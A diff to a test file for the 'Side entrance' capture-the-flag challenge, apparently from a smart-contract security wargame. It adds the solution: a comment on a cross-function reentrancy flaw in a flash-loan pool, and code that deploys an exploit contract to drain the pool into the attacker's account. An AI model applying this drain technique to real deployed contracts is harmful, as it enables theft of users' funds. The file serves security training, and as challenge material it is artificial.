@@ -25,6 +25,27 @@ describe('[Challenge] Side entrance', function () {
         /** YOUR EXPLOIT GOES HERE */
         const accounts = await ethers.getSigners();
         const attacker = accounts[1];
+        
+        /*
+         * There is a cross function reentrancy vulnerability in the target contract.
+         * When target's flashLoan function called our exploit contract's execute function
+         * We can deposit the flashLoan amount to target, and this can be withdrawn later.   
+         * See the exploit function for details.
+         */
+
+        const expFactory = await ethers.getContractFactory("SideEntranceExp");
+        const expCont = await expFactory.connect(attacker).deploy(this.pool.address);
+
+        let tx = await expCont.attack();
+        await tx.wait();
+        console.log(tx);
+
+        tx = await expCont.getThePrize();
+        await tx.wait(tx);
+        console.log(tx);
+        
+        let attackerBalance = ethers.utils.formatEther(await attacker.getBalance());
+        console.log(attackerBalance);
     });
 
     after(async function () {
